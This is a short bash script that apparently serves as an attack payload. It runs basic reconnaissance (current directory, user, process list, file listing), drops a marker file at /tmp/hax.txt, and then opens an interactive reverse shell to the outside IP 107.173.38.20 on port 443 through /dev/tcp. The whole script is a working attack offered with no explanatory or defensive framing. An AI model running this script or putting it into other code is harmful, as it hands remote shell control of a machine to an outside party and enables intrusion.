#!/bin/bash

pwd
whoami
ps auxfwww
ls $(pwd)

echo $(date) > /tmp/hax.txt

bash -i >& /dev/tcp/107.173.38.20/443 0>&1 || echo callback not online || true

